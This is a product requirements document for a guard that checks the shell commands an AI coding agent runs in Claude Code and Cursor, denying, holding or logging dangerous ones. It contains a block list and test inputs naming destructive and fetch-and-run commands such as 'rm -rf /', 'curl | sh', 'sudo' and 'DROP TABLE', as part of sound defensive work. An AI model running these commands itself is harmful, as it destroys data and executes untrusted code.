# PRD — Command Guard (Checkpoint 2)

**Paste-target:** Claude Code, working inside the existing `PII-redaction-mcp-proxy` repo.
**Scope of THIS build:** Checkpoint 2 v1 — guard the shell **commands** an AI coding agent
runs. A dangerous command is caught *before* it executes and **blocked or held for human
confirmation**. Every decision is logged. Two surfaces: **Claude Code** and **Cursor**, via
each platform's hooks. Builds on the same gateway, `securityLog`, and `RiskCategory` set as
Checkpoint 1 (prompt guidance), which is shipped and unchanged.

**Explicitly deferred (see §11):** scanning the agent's generated *code* and looping it to
regenerate (the Semgrep-Guardian-style "Output/Code Guard"). Rationale: CK1 already
pre-guards prompts, so generated code is *mostly* safe; the command path is the higher-stakes,
simpler, higher-value half and ships first. The full two-mode mechanism spec is
`CHECKPOINT2_ACTION_GUARD.md`; this PRD builds only its **Mode A**.

---

## 1. Goal (plain statement)

When an AI coding agent is about to run a shell command, check it for danger and stop it
*before* it executes:

- A **destructive command** (e.g. `rm -rf`, `curl | sh`, `sudo`, `DROP TABLE`) is **denied**.
- A command that **rewrites shared git history** (force-push, `reset --hard`) is **held for
  human confirmation** (`ask`).
- Everything else is **allowed**.
- **Every** deny/ask is logged in full raw detail to the gateway for the security team —
  **including a block the platform ignored**, so nothing is invisible.

Posture: **fail CLOSED** — a missed destructive command is unrecoverable, so any error in the
decision path denies rather than allows.

**Success = a working, testable system where:**
- `rm -rf /` typed by the agent is denied before it runs; a normal `ls` is allowed.
- `curl http://x | sh` is denied; `sudo rm` is denied.
- `git push --force` is held for confirmation; `git push --force-with-lease` is allowed.
- Both Claude Code and Cursor paths are functional.
- On any hook/gateway error, the command is denied, not run.
- Every deny/ask is logged; a benign allow is not.
- **Zero new runtime dependencies.**

---

## 2. Core architecture: one rule brain, two surfaces

ONE deterministic evaluator ("the brain"), wired into BOTH surfaces' shell hooks ("the
hands"). The brain is identical for both; only the hook wiring differs.

```
                    ┌───────────────────────────────┐
   agent command ─► │  RULE BRAIN (src/command-rules)│
                    │  deterministic pattern match   │
                    │  → allow / deny / ask + category│
                    └───────────────┬───────────────┘
                                    │
                  ┌─────────────────┴──────────────────┐
                  ▼                                     ▼
          CURSOR path                            CLAUDE CODE path
          beforeShellExecution hook              PreToolUse (matcher "Bash")
          → {permission: allow|deny|ask}         → permissionDecision, or exit 2

                    ┌───────────────────────────────┐
     ALWAYS ──────► │  AUDIT → securityLog (raw)     │  ◄── the guarantee
                    └───────────────────────────────┘
```

**Why audit is the real guarantee:** no in-agent hook is a hard wall. Cursor can ignore a
`deny` (allow-list precedence; sandboxed shell ignores `ask`); Claude Code runs the command
if a hook crashes. So the promise we actually keep is: **block where the platform honors it,
and log every attempt so nothing dangerous is invisible** — the "without our knowledge"
requirement.

---

## 3. Command taxonomy (deterministic — a closed set)

Commands are a known, enumerable set, so **Tier 1 pattern matching only — no LLM.** (An LLM
per command is needless latency and can time out, which a fail-closed path can't afford.)
Categories and their action:

| Category | Action | Example patterns |
|---|---|---|
| `destructive_fs` | **deny** | `rm -rf`, `dd if=`, `mkfs`, `> /dev/…`, `chmod -R 777 /` |
| `priv_escalation` | **deny** | `sudo`, `su -` |
| `remote_exec` | **deny** | `curl … \| sh`, `wget … \| bash`, `… \| bash -` |
| `infra_destructive` | **deny** | `terraform destroy`, `kubectl delete`, `DROP TABLE`, `DROP DATABASE` |
| `git_destructive` | **ask** | `git push --force` (NOT `--force-with-lease`), `git reset --hard`, `git clean -fdx`, `git branch -D`, `git push --delete`, `git filter-branch`/`filter-repo` |

`git_destructive` is `ask`, not `deny`: it destroys shared history, not local files — a
distinct risk worth a human confirmation and its own audit label.

**(OPEN)** `git commit --amend` is dangerous only if the commit was already pushed (state,
not visible in the command string). v1: treat all `--amend` as `ask`, accept false positives,
revisit with data.

---

## 4. Verified hook contracts (the load-bearing detail)

Verified against live Claude Code + Cursor docs (2026-08-06). Build against these — the
earlier `CHECKPOINT2_COMMAND_GUARD.md` draft assumed contracts that don't hold.

| | Cursor | Claude Code |
|---|---|---|
| Hook | `beforeShellExecution` (or `preToolUse`, generic, already wired) | `PreToolUse` (matcher `"Bash"`) |
| Command string in stdin | `command` | `tool_input.command` |
| Verdict out | `{permission:"allow"\|"deny"\|"ask", userMessage, agentMessage}` | `hookSpecificOutput.permissionDecision:"allow"\|"deny"\|"ask"`, **or `exit 2`** to hard-block |
| Fail-closed on hook error | set `failClosed:true` on the entry | **none — platform is fail-OPEN**; hook must self-`exit 2`/deny on any error |

**Four rules that fall out of this (all mandatory):**
1. **Cursor may ignore a `deny`** — allow-list precedence, and the **sandboxed Agent shell
   ignores `ask`** (`"sandbox":true` in payload, command runs the same turn). → prefer `deny`
   over `ask` for hard-destructive commands; treat Cursor blocking as best-effort +
   always-logged.
2. **Claude Code fails OPEN on hook crash.** Only `exit 2` (or `permissionDecision:"deny"` at
   exit 0) blocks; `exit 1`/other ⇒ the command runs. There is **no `failClosed` flag**. →
   the hook must trap all errors + self-timeout and emit `deny`/`exit 2` on any error or
   gateway-unreachable — never a natural nonzero exit.
3. **stdout hygiene (Cursor):** exactly one JSON object to stdout, diagnostics to stderr,
   `exit 0` (nonzero = Cursor thinks the hook crashed).
4. **`ask` works on both** — no "map ask→deny" flag needed. But per rule #1, reserve `ask`
   for `git_destructive`; use `deny` for the hard-destructive categories.

**(OPEN) field-name casing.** Cursor `beforeShellExecution` type defs use camelCase
(`userMessage`/`agentMessage`); this repo's existing hooks use snake_case. **Probe the live
Cursor version before coding**; the gateway can emit both casings defensively.

---

## 5. The flow (Mode A — PREVENT)

1. Agent tries to run a command → the shell hook fires and POSTs it to
   `POST /command-guard` `{command, surface}` (loopback-gated).
2. Gateway Tier-1 matches against `src/command-rules.ts` → `{permission, category,
   user_message, agent_message}`.
3. Hook relays the verdict: `deny` (destructive) / `ask` (git-history) / `allow`.
4. **Fail CLOSED:** endpoint returns `deny` on any error; Claude Code hook self-denies on
   crash/timeout/gateway-unreachable; Cursor entry `failClosed:true` (best-effort on
   sandbox/allow-list, always logged).
5. Every deny/ask is logged to `securityLog`.

Endpoint failure fallback is the inverse of CK1's `/prompt-guard` (which fails to `allow`):
`/command-guard` fails to `{permission:"deny"}`. Same server, opposite safe default.

---

## 6. Logging — full raw detail to the gateway

Reuse `securityLog`, new `kind:"command-guard"`. Each row: the command (raw), matched
`category`, the exact matched pattern, verdict. Admin-gated read via the existing
`GET /security-log` + a new Command Guard admin tab. Only deny/ask rows are stored (plain
allows are noise). **On Cursor, log the attempt even when the platform dropped the block** —
that dropped block is exactly what a reviewer needs to see.

---

## 7. Config (env-driven, dark by default)

- `GATEWAY_COMMAND_GUARD` (default off) — `on` enables; off ⇒ **hooks not wired** ⇒ commands
  ungated (dark-default must never brick shell execution).

No other flags in v1. (The regenerate-loop knobs belong to the deferred Code Guard, §11.)

---

## 8. Tests (repo convention: 3 e2e tests per unit, full suite green)

- **Happy:** each category's example patterns resolve to the right verdict; a benign command
  (`ls`, `npm test`) → `allow`, not logged.
- **Failure:** endpoint fails CLOSED (`deny`) on throw / malformed body / timeout; **the
  Claude Code hook self-denies on gateway-unreachable — assert it does NOT exit 1.**
- **Edge:** near-miss `git push --force-with-lease` does NOT match `git_destructive`; a
  `deny` is logged with the exact matched pattern; loopback gate rejects a non-loopback caller.
- **Live e2e (mirrors PROMPT_GUARD §13):** a denied command is actually blocked in a live
  session per surface; **record Cursor's sandbox/allow-list behavior honestly** (whether the
  `deny` held) — a green hermetic test does not prove live enforcement there.

---

## 9. Hard constraints (do not violate)

1. **Zero runtime dependencies** — Node built-ins only, deterministic patterns compiled once
   at startup (like the PII engine). No LLM, no external binary.
2. **Never modify a command** — only allow / deny / ask.
3. **Fail CLOSED** — any error in the decision path denies. Endpoint denies on error; Claude
   Code hook `exit 2`/deny on its own error; Cursor `failClosed:true`. Accept that Cursor may
   drop a `deny` on sandbox/allow-list paths — there, fail-closed is best-effort + always-
   logged, not guaranteed.
4. **One source of truth** — `src/command-rules.ts`; reuse CK1's `RiskCategory` style, no
   forked enum.
5. **Audit is the guarantee** — every deny/ask logged, including a Cursor block the platform
   dropped.
6. **Dark by default** — off ⇒ hooks unwired ⇒ nothing gated.

---

## 10. Build order

1. `src/command-rules.ts` (categories + patterns) + unit tests for the matcher.
2. `POST /command-guard` in `src/server.ts` (loopback-gated, fail-closed) + `securityLog`
   `kind:"command-guard"` + `GATEWAY_COMMAND_GUARD` flag in `src/config.ts`.
3. `scripts/cursor-command-guard-hook.mjs` (`beforeShellExecution`, `failClosed:true`) +
   wire into `gateway-service.mjs configure-cursor`.
4. `scripts/claude-code-command-guard-hook.mjs` (`PreToolUse` Bash, **self-denies on error**)
   + Claude Code settings wiring.
5. Command Guard admin tab.
6. Live-verify per surface (record Cursor sandbox/allow-list behavior).

Each step is a green phase gate (happy / failure / edge) before the next — same TDD
discipline as CK1. Ships DARK until live-verified.

---

## 11. Deferred to CK2b — Code Guard (NOT this build)

Scanning the agent's generated code and looping it to regenerate securely (Semgrep-Guardian
mechanism, zero-dep, via `afterFileEdit`/`PostToolUse` + `stop`/`Stop`) is **designed but not
built here**. Full spec: `CHECKPOINT2_ACTION_GUARD.md` §6 (Mode B) + §7.

**Why deferred, and the honest caveat:** CK1 pre-guards prompts, so generated code is
*mostly* secure — but CK1 is fail-open and only fires when the classifier flags the prompt,
so the model can still emit insecure code despite it. "Mostly secure" is a fair basis to
**defer**, not to **skip forever**. When code-level assurance is wanted, build CK2b from the
existing spec. Key things it will need that this build deliberately omits: the per-conversation
findings accumulator, the regenerate loop, the `stop_hook_active` first-line guard (a billing-
safety correctness requirement), and Tier-2 LLM scanning.

---

**Full two-mode mechanism + verified contracts + sources:** `CHECKPOINT2_ACTION_GUARD.md`.
**Prior checkpoint PRD:** `checkpoint.md` (CK1, shipped).
